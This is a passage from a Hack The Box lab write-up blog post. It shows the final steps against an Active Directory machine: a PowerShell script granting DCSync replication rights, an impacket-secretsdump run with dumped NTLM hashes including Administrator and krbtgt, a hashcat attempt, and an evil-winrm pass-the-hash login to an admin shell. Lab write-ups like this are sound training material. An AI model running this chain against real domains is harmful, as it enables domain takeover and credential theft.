+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$acl</span> <span class=p>=</span> <span class=nb>get-acl</span> <span class=s2>&#34;ad:DC=htb,DC=local&#34;</span>
+</span></span><span class=line><span class=cl><span class=nv>$id</span> <span class=p>=</span> <span class=p>[</span><span class=no>Security.Principal.WindowsIdentity</span><span class=p>]::</span><span class=n>GetCurrent</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=nv>$user</span> <span class=p>=</span> <span class=nb>Get-ADUser</span> <span class=n>-Identity</span> <span class=nv>$id</span><span class=p>.</span><span class=py>User</span>
+</span></span><span class=line><span class=cl><span class=nv>$sid</span> <span class=p>=</span> <span class=nb>new-object</span> <span class=n>System</span><span class=p>.</span><span class=py>Security</span><span class=p>.</span><span class=py>Principal</span><span class=p>.</span><span class=py>SecurityIdentifier</span> <span class=nv>$user</span><span class=p>.</span><span class=py>SID</span>
+</span></span><span class=line><span class=cl><span class=c># rightsGuid for the extended right Ds-Replication-Get-Changes-All</span>
+</span></span><span class=line><span class=cl><span class=nv>$objectguid</span> <span class=p>=</span> <span class=nb>new-object</span> <span class=n>Guid</span>  <span class=n>1131f6ad</span><span class=p>-</span><span class=n>9c07</span><span class=p>-</span><span class=n>11d1-f79f</span><span class=p>-</span><span class=n>00c04fc2dcd2</span>
+</span></span><span class=line><span class=cl><span class=nv>$identity</span> <span class=p>=</span> <span class=p>[</span><span class=no>System.Security.Principal.IdentityReference</span><span class=p>]</span> <span class=nv>$sid</span>
+</span></span><span class=line><span class=cl><span class=nv>$adRights</span> <span class=p>=</span> <span class=p>[</span><span class=no>System.DirectoryServices.ActiveDirectoryRights</span><span class=p>]</span> <span class=s2>&#34;ExtendedRight&#34;</span>
+</span></span><span class=line><span class=cl><span class=nv>$type</span> <span class=p>=</span> <span class=p>[</span><span class=no>System.Security.AccessControl.AccessControlType</span><span class=p>]</span> <span class=s2>&#34;Allow&#34;</span>
+</span></span><span class=line><span class=cl><span class=nv>$inheritanceType</span> <span class=p>=</span> <span class=p>[</span><span class=no>System.DirectoryServices.ActiveDirectorySecurityInheritance</span><span class=p>]</span> <span class=s2>&#34;None&#34;</span>
+</span></span><span class=line><span class=cl><span class=nv>$ace</span> <span class=p>=</span> <span class=nb>new-object</span> <span class=n>System</span><span class=p>.</span><span class=py>DirectoryServices</span><span class=p>.</span><span class=py>ActiveDirectoryAccessRule</span> <span class=nv>$identity</span><span class=p>,</span><span class=nv>$adRights</span><span class=p>,</span><span class=nv>$type</span><span class=p>,</span><span class=nv>$objectGuid</span><span class=p>,</span><span class=nv>$inheritanceType</span>
+</span></span><span class=line><span class=cl><span class=nv>$acl</span><span class=p>.</span><span class=py>AddAccessRule</span><span class=p>(</span><span class=nv>$ace</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=c># rightsGuid for the extended right Ds-Replication-Get-Changes</span>
+</span></span><span class=line><span class=cl><span class=nv>$objectguid</span> <span class=p>=</span> <span class=nb>new-object</span> <span class=n>Guid</span> <span class=n>1131f6aa</span><span class=p>-</span><span class=n>9c07</span><span class=p>-</span><span class=n>11d1-f79f</span><span class=p>-</span><span class=n>00c04fc2dcd2</span>
+</span></span><span class=line><span class=cl><span class=nv>$ace</span> <span class=p>=</span> <span class=nb>new-object</span> <span class=n>System</span><span class=p>.</span><span class=py>DirectoryServices</span><span class=p>.</span><span class=py>ActiveDirectoryAccessRule</span> <span class=nv>$identity</span><span class=p>,</span><span class=nv>$adRights</span><span class=p>,</span><span class=nv>$type</span><span class=p>,</span><span class=nv>$objectGuid</span><span class=p>,</span><span class=nv>$inheritanceType</span>
+</span></span><span class=line><span class=cl><span class=nv>$acl</span><span class=p>.</span><span class=py>AddAccessRule</span><span class=p>(</span><span class=nv>$ace</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nb>Set-acl</span> <span class=n>-aclobject</span> <span class=nv>$acl</span> <span class=s2>&#34;ad:DC=htb,DC=local&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><ul><li>Dunno why</li></ul><ol start=8><li>To dump the creds,</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>impacket-secretsdump -outputfile htblocal_hashes -just-dc htb.local/svc-alfresco@10.129.191.98
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Password:
+</span></span><span class=line><span class=cl>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+</span></span><span class=line><span class=cl>[*] Using the DRSUAPI method to get NTDS.DIT secrets
+</span></span><span class=line><span class=cl>htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+</span></span><span class=line><span class=cl>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class=line><span class=cl>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+</span></span><span class=line><span class=cl>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class=line><span class=cl>&lt;SNIP&gt;
+</span></span></code></pre></td></tr></table></div></div><ol start=9><li>The administrator hash cannot be cracked.</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>hashcat -a <span class=m>0</span> -m <span class=m>1000</span> <span class=s1>&#39;32693b11e6aa90eb43d32c72a07ceea6&#39;</span> /usr/share/wordlists/rockyou.txt 
+</span></span></code></pre></td></tr></table></div></div><ol start=10><li>We can use pass-the-hash instead</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>evil-winrm -i 10.129.191.98 -u Administrator -H <span class=s2>&#34;32693b11e6aa90eb43d32c72a07ceea6&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Evil-WinRM shell v3.7
+</span></span><span class=line><span class=cl>                                        
+</span></span><span class=line><span class=cl>Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+</span></span><span class=line><span class=cl>                                        
+</span></span><span class=line><span class=cl>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span class=line><span class=cl>                                        
+</span></span><span class=line><span class=cl>Info: Establishing connection to remote endpoint
+</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; 
+</span></span></code></pre></td></tr></table></div></div><ul><li>Yay</li></ul><ol start=11><li>Get flag in administrator desktop.</li></ol></section><footer class=article-footer><section class=article-tags><a href=/tags/htb/>HTB</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/htb-remote-writeup/><div class=article-image><img src=/p/htb-remote-writeup/1.b5688338ca3ce4b1e41ee9ab55ac6419_hu_89d711bc665e1e75.png width=250 height=150 loading=lazy alt="Featured image of post HTB Remote Writeup" data-hash="md5-tWiDOMo85LHkHumrVaxkGQ=="></div><div class=article-details><h2 class=article-title>HTB Remote Writeup</h2></div></a></article><article class=has-image><a href=/p/htb-metatwo-writeup/><div class=article-image><img src=/p/htb-metatwo-writeup/1.925183ec5d19f88905ac762cb261d8cd_hu_90d7115ef374d61d.png width=250 height=150 loading=lazy alt="Featured image of post HTB MetaTwo Writeup" data-hash="md5-klGD7F0Z+IkFrHYssmHYzQ=="></div><div class=article-details><h2 class=article-title>HTB MetaTwo Writeup</h2></div></a></article><article class=has-image><a href=/p/htb-access-writeup/><div class=article-image><img src=/p/htb-access-writeup/1.4f3ed6721d0b1f0d7cb5c076f91c8b33_hu_7103002c3cf8d65.png width=250 height=150 loading=lazy alt="Featured image of post HTB Access Writeup" data-hash="md5-Tz7Wch0LHw18tcB2+RyLMw=="></div><div class=article-details><h2 class=article-title>HTB Access Writeup</h2></div></a></article><article class=has-image><a href=/p/htb-delivery-writeup/><div class=article-image><img src=/p/htb-delivery-writeup/c55af6eadd5b60bac831d73c1a951327.03a81260a84541d40dc13396b054e2b6_hu_c4f878e7fe38a287.png width=250 height=150 loading=lazy alt="Featured image of post HTB Delivery Writeup" data-hash="md5-A6gSYKhFQdQNwTOWsFTitg=="></div><div class=article-details><h2 class=article-title>HTB Delivery Writeup</h2></div></a></article><article class=has-image><a href=/p/htb-administrator-writeup/><div class=article-image><img src=/p/htb-administrator-writeup/9d232b1558b7543c7cb85f2774687363.51683f38be59c5f378320400d5a07b8f_hu_65bd3124748aa3f4.png width=250 height=150 loading=lazy alt="Featured image of post HTB Administrator Writeup" data-hash="md5-UWg/OL5ZxfN4MgQA1aB7jw=="></div><div class=article-details><h2 class=article-title>HTB Administrator Writeup</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
+2025 -
+2026 Froginacup's site</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.33.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
